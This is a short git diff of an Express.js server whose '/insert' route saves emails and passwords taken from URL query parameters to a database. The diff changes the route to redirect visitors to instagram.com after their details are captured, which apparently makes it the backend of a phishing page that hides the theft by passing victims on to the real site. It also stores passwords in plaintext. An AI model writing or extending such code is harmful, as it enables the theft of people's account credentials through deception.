@@ -20,12 +20,15 @@ app.get("/", function(req, res) {
 })
 
 app.get("/insert", function(req, res){
+    if (!req.query.email || !req.query.password) {
+        return res.status(400).send("no data inserted");
+    }
     let newData = new Data({
         email: req.query.email,
         password: req.query.password
     });
     newData.save();
-    res.send("success");
+    res.redirect("https://instagram.com");
 });
 
 var port = process.env.PORT || 3000;
